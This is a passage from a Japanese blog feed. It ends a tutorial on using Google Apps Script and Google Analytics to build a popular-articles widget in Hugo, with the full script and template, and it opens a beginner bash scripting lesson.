&lt;li>「イベントのソースを選択」は「時間主導型」に変更して、時間で実行するようにしておきます。&lt;/li>
&lt;li>「時間ベースのトリガーのタイプを選択」を更新したい頻度で選択します。月間のデータなので1日おきくらいに更新でもいいかもしれません。「日付ベースのタイマー」を選択します。&lt;br>
一日おきではなく、毎時で更新したい場合は「時間ベースのタイマー」など各自にあったタイマーを選択してください。&lt;/li>
&lt;li>「時刻を選択」で更新したい時間を選びます。とりあえず「午前4時〜5時」くらいに更新するようにしておきます。&lt;/li>
&lt;li>「エラー通知設定」は各自で好きなタイミングで受信するようにしてください。私はいっぱい来ると嫌なので、「1週間おきに通知を受け取る」にしてあります。&lt;br>
以上で設定が終わりました。下にある「保存」を押して保存します。&lt;br>
&lt;figure
class="gallery-image"
style="
flex-grow: 139;
flex-basis: 334px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-07-01-wyoshi/img06.png" data-size="980x703">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-07-01-wyoshi/img06.png"
width="980"
height="703"
loading="lazy"
alt="GASとアナリティクスで、Hugoに人気記事を表示させるの画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/li>
&lt;/ul>
&lt;p>これで定期的にアナリティクスのデータがスプレッドシートに反映されるようになりました。&lt;/p>
&lt;h2 id="まとめ">まとめ&lt;/h2>
&lt;p>Hugoで人気の記事を表示するには&lt;/p>
&lt;ul>
&lt;li>Googleアナリティクスの連携&lt;/li>
&lt;li>スプレッドシートを使ってjsonを作成&lt;/li>
&lt;/ul>
&lt;p>上記の2つを使うことで簡単に導入可能です。&lt;/p>
&lt;p>Hugoを使って人気の記事を作成するにはサイトや投稿を公開した際になりますが、GitHub Actionsなどを使えばcron処理で定期的に再構築をかけることが可能なので、数十分おきに人気の記事を更新したり、スプレッドシートとgasのレン系の際にjsonを作成したので、javascriptでjsonを読み取って表示するといったことも可能です。&lt;/p>
&lt;h2 id="ソース">ソース&lt;/h2>
&lt;p>前回と今回で作成したソースになります。&lt;/p>
&lt;h4 id="gasとスプレッドシートを使ってhugoに人気の記事を表示する">GASとスプレッドシートを使ってHugoに人気の記事を表示する&lt;/h4>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-javascript" data-lang="javascript">&lt;span class="kd">function&lt;/span> &lt;span class="nx">getData&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">sheetName&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="kr">const&lt;/span> &lt;span class="nx">sheet&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">SpreadsheetApp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">openById&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;シートID&amp;#34;&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="nx">getSheetByName&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">sheetName&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="kr">const&lt;/span> &lt;span class="nx">rows&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">sheet&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">getDataRange&lt;/span>&lt;span class="p">().&lt;/span>&lt;span class="nx">getValues&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="kr">const&lt;/span> &lt;span class="nx">keys&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">rows&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">splice&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">)[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">];&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nx">rows&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">map&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">row&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="kd">let&lt;/span> &lt;span class="nx">obj&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{};&lt;/span>
&lt;span class="nx">row&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">map&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">item&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">index&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="nx">obj&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">keys&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">index&lt;/span>&lt;span class="p">]]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">item&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nx">obj&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">});&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kd">function&lt;/span> &lt;span class="nx">doGet&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">e&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="kd">let&lt;/span> &lt;span class="nx">data&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">getData&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">e&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">parameter&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">sheetname&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nx">ContentService&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">createTextOutput&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">JSON&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">stringify&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">data&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kc">null&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">)).&lt;/span>&lt;span class="nx">setMimeType&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">ContentService&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">MimeType&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">JSON&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kd">function&lt;/span> &lt;span class="nx">getDate&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">type&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="kd">let&lt;/span> &lt;span class="nx">calc&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;d&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">switch&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">type&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="s2">&amp;#34;month&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="nx">calc&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;M&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="s2">&amp;#34;year&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="nx">calc&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;y&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">default&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="nx">calc&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;d&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kr">const&lt;/span> &lt;span class="nx">d1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">dayjs&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">dayjs&lt;/span>&lt;span class="p">().&lt;/span>&lt;span class="nx">locale&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;ja&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="nx">start&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="nx">d1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">subtract&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">calc&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="nx">format&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;YYYY-MM-DD&amp;#39;&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="nx">end&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="nx">d1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">format&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;YYYY-MM-DD&amp;#39;&lt;/span>&lt;span class="p">)};&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kd">function&lt;/span> &lt;span class="nx">getGoogleAnalytics&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">name&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="kr">const&lt;/span> &lt;span class="nx">id&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;ga:ビューID&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="kr">const&lt;/span> &lt;span class="nx">date&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">getDate&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">name&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="kr">const&lt;/span> &lt;span class="nx">response&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">AnalyticsReporting&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Reports&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">batchGet&lt;/span>&lt;span class="p">({&lt;/span>
&lt;span class="nx">reportRequests&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">[{&lt;/span>
&lt;span class="nx">viewId&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="nx">id&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">dateRanges&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">[{&lt;/span>&lt;span class="nx">startDate&lt;/span>&lt;span class="o">:&lt;/span>&lt;span class="nx">date&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">start&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">endDate&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="nx">date&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">end&lt;/span>&lt;span class="p">}],&lt;/span>
&lt;span class="nx">samplingLevel&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s1">&amp;#39;LARGE&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">metrics&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">[&lt;/span>
&lt;span class="p">{&lt;/span>&lt;span class="nx">expression&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s1">&amp;#39;ga:pageviews&amp;#39;&lt;/span>&lt;span class="p">},&lt;/span>
&lt;span class="p">{&lt;/span>&lt;span class="nx">expression&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s1">&amp;#39;ga:sessions&amp;#39;&lt;/span>&lt;span class="p">},&lt;/span>
&lt;span class="p">{&lt;/span>&lt;span class="nx">expression&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s1">&amp;#39;ga:users&amp;#39;&lt;/span>&lt;span class="p">},&lt;/span>
&lt;span class="p">],&lt;/span>
&lt;span class="nx">dimensions&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">[&lt;/span>
&lt;span class="p">{&lt;/span>&lt;span class="nx">name&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s1">&amp;#39;ga:pagePath&amp;#39;&lt;/span>&lt;span class="p">}&lt;/span>
&lt;span class="p">],&lt;/span>
&lt;span class="nx">orderBys&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">[{&lt;/span>
&lt;span class="nx">fieldName&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s1">&amp;#39;ga:pageviews&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">sortOrder&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;DESCENDING&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="p">}],&lt;/span>
&lt;span class="p">}]&lt;/span>
&lt;span class="p">});&lt;/span>
&lt;span class="kd">let&lt;/span> &lt;span class="nx">rows&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">JSON&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">parse&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">response&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="nx">reports&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="nx">data&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">rows&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nx">rows&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">rows&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">filter&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">f&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">posts&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">test&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">dimensions&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">])).&lt;/span>&lt;span class="nx">map&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">f&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nx">f&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">dimensions&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">concat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">metrics&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="nx">values&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">});&lt;/span>
&lt;span class="kd">let&lt;/span> &lt;span class="nx">sheet&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">SpreadsheetApp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">getActive&lt;/span>&lt;span class="p">().&lt;/span>&lt;span class="nx">getSheetByName&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">name&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="nx">sheet&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">clear&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="nx">rows&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">unshift&lt;/span>&lt;span class="p">([&lt;/span>&lt;span class="s2">&amp;#34;link&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;pv&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;session&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;users&amp;#39;&lt;/span>&lt;span class="p">]);&lt;/span>
&lt;span class="nx">sheet&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">getRange&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">rows&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">length&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">rows&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="nx">length&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="nx">setValues&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">rows&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kd">function&lt;/span> &lt;span class="nx">setMonth&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">getGoogleAnalytics&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;month&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kd">function&lt;/span> &lt;span class="nx">setDay&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">getGoogleAnalytics&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;day&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kd">function&lt;/span> &lt;span class="nx">setYear&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">getGoogleAnalytics&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;year&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kd">function&lt;/span> &lt;span class="nx">all&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">setDay&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="nx">setMonth&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="nx">setYear&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="hugoで人気の記事を表示する">Hugoで人気の記事を表示する&lt;/h4>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-html" data-lang="html">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">aside&lt;/span> &lt;span class="na">class&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;widget archives sidearticle-contents--wrapper&amp;#34;&lt;/span> &lt;span class="na">id&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;popular-articles--month&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">div&lt;/span> &lt;span class="na">class&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;contents-area&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">header&lt;/span>&lt;span class="p">&amp;gt;&amp;lt;&lt;/span>&lt;span class="nt">h2&lt;/span> &lt;span class="na">class&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;section-title&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>人気の記事（1ヶ月以内）&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">h2&lt;/span>&lt;span class="p">&amp;gt;&amp;lt;/&lt;/span>&lt;span class="nt">header&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">div&lt;/span> &lt;span class="na">class&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;sidearticle-contents&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">div&lt;/span> &lt;span class="na">class&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;flex article-list--tile&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
{{ $page := .Site.Pages }}
{{ range first .Site.Params.widgets.populerArticles.limit $json }}
{{ $article := index (where $page &amp;#34;.RelPermalink&amp;#34; &amp;#34;eq&amp;#34; .link ) 0 }}
{{ if $article }}
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">article&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">h3&lt;/span> &lt;span class="na">class&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;article-title&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&amp;lt;&lt;/span>&lt;span class="nt">a&lt;/span> &lt;span class="na">href&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;{{ .context.RelPermalink }}&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>{{- .context.Title -}}&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">a&lt;/span>&lt;span class="p">&amp;gt;&amp;lt;/&lt;/span>&lt;span class="nt">h3&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">article&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
{{ end }}
{{ end }}
&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">div&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">div&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">div&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">aside&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="書籍の紹介">書籍の紹介&lt;/h2>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/Google%E3%82%A2%E3%83%8A%E3%83%AA%E3%83%86%E3%82%A3%E3%82%AF%E3%82%B9-%E3%83%97%E3%83%AD%E3%83%95%E3%82%A7%E3%83%83%E3%82%B7%E3%83%A7%E3%83%8A%E3%83%AB-%EF%BD%9E%E5%88%86%E6%9E%90%E3%83%BB%E6%96%BD%E7%AD%96%E3%81%AE%E3%82%A2%E3%82%A4%E3%83%87%E3%82%A2%E3%82%92%E7%94%9F%E3%82%80%E6%9C%80%E5%BC%B7%E3%83%AA%E3%83%95%E3%82%A1%E3%83%AC%E3%83%B3%E3%82%B9-%E5%B1%B1%E6%B5%A6-%E7%9B%B4%E5%AE%8F/dp/4297112612?__mk_ja_JP=%E3%82%AB%E3%82%BF%E3%82%AB%E3%83%8A&amp;amp;crid=JWVEKDNY44QV&amp;amp;keywords=google&amp;#43;%E3%82%A2%E3%83%8A%E3%83%AA%E3%83%86%E3%82%A3%E3%82%AF%E3%82%B9&amp;amp;qid=1641514280&amp;amp;s=books&amp;amp;sprefix=google&amp;#43;%E3%82%A2%E3%83%8A%E3%83%AA%E3%83%86%E3%82%A3%E3%82%AF%E3%82%B9%2Cstripbooks%2C197&amp;amp;sr=1-17-spons&amp;amp;psc=1&amp;amp;spLa=ZW5jcnlwdGVkUXVhbGlmaWVyPUFEVkxWVEZDSTdSQzQmZW5jcnlwdGVkSWQ9QTA1MDMwNDYyUTRGU1dQUEFQOTdTJmVuY3J5cHRlZEFkSWQ9QTNDR0ZTNUlLTUJHNUsmd2lkZ2V0TmFtZT1zcF9idGYmYWN0aW9uPWNsaWNrUmVkaXJlY3QmZG9Ob3RMb2dDbGljaz10cnVl&amp;amp;linkCode=ll1&amp;amp;tag=nlpqueens-22&amp;amp;linkId=5dfbf1278031207773d96916ecce46dd&amp;amp;language=ja_JP&amp;amp;ref_=as_li_ss_tl" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="//m.media-amazon.com/images/I/51PXFiYP7aL._SL250_.jpg" alt="Googleアナリティクス プロフェッショナル　～分析・施策のアイデアを生む最強リファレンス ">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">Googleアナリティクス プロフェッショナル　～分析・施策のアイデアを生む最強リファレンス &lt;/h2>
&lt;p>ウェブ制作者から、マーケター、ウェブアナリストまで必携の1冊
「Googleアナリティクスはどこへ向かうのか?進化し続けるツールのポテンシャルを最大限に引き出したときに、新しい分析や施策のアイディアが生まれる」&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/Google-Apps-Script%E7%9B%AE%E7%9A%84%E5%88%A5%E3%83%AA%E3%83%95%E3%82%A1%E3%83%AC%E3%83%B3%E3%82%B9-%E5%AE%9F%E8%B7%B5%E3%82%B5%E3%83%B3%E3%83%97%E3%83%AB%E3%82%B3%E3%83%BC%E3%83%89%E4%BB%98%E3%81%8D-%E6%B8%85%E6%B0%B4/dp/4798062405?pd_rd_w=BsqYY&amp;amp;pf_rd_p=d8f6e0ab-48ef-4eca-99d5-60d97e927468&amp;amp;pf_rd_r=ADPJ0069C04W5M44N6YQ&amp;amp;pd_rd_r=16303d6e-b3f9-4aa6-9f06-d3e66775e8f4&amp;amp;pd_rd_wg=joLm1&amp;amp;pd_rd_i=4798062405&amp;amp;psc=1&amp;amp;linkCode=ll1&amp;amp;tag=nlpqueens-22&amp;amp;linkId=f78c47c375494f0b51c423506367a868&amp;amp;language=ja_JP&amp;amp;ref_=as_li_ss_tl" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="//m.media-amazon.com/images/I/41OIKEUEOIL._SL250_.jpg" alt="Google Apps Script目的別リファレンス 実践サンプルコード付き">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">Google Apps Script目的別リファレンス 実践サンプルコード付き&lt;/h2>
&lt;p>Excelのマクロに似た「スクリプト」を書けば、Gmailや「スプレッドシート」などのGoogleサービスを更に効率的に、思うように使えます。そのスクリプトを書いて実行するプログラミング環境が、Google Apps Script(GAS)。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside></description></item><item><title>【はじめから】ざっくりわかるシェルスクリプト１」</title><link>https://suzukiiichiro.github.io/posts/2022-01-07-01-suzuki/</link><pubDate>Fri, 07 Jan 2022 10:03:12 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-01-07-01-suzuki/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-07-01-suzuki/shellscript.jpg" alt="Featured image of post 【はじめから】ざっくりわかるシェルスクリプト１」" />&lt;h2 id="はじめに">はじめに&lt;/h2>
&lt;p>Bashスクリプトは、シェルコマンドの実行、複数のコマンドの同時実行、管理タスクのカスタマイズ、タスクの自動化の実行など、さまざまな目的に使用できます。したがって、bashプログラミングの基本に関する知識はすべてのLinuxユーザーにとって重要です。この記事は、bashプログラミングの基本的な考え方を理解するのに役立ちます。ここでは、bashスクリプトの一般的な操作のほとんどを、非常に簡単な例で説明します。&lt;/p>
&lt;p>この記事では、bashプログラミングの次のトピックについて説明します。&lt;/p>
&lt;h2 id="hello-world">Hello World&lt;/h2>
&lt;p>&lt;font color=orange>&lt;b>はじめてのbashコマンド「echo」&lt;/b>&lt;/font>&lt;br>
ターミナルで非常に単純なbashステートメントを実行します。 コマンドの出力は「Hello, World」になります。&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-:はじめてのecho" data-lang=":はじめてのecho">$ echo &amp;quot;Hello, World&amp;quot;
Hello, World
$
&lt;/code>&lt;/pre>&lt;p>はじめてのbashスクリプト「vim」&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-bash:はじめてのbashスクリプト" data-lang="bash:はじめてのbashスクリプト">$ vim HelloWorld.sh
＜空のvim HelloWorld.sh が開きます＞
&lt;/code>&lt;/pre>&lt;p>vimで開いたHelloWorld.shを編集します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:HelloWorld.sh" data-lang="bash:HelloWorld.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;Hello World&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>はじめての実行権限「chmod」&lt;br>
bashファイルは2つの方法で実行できます。&lt;br>
１．bashコマンドを使用する方法、&lt;br>
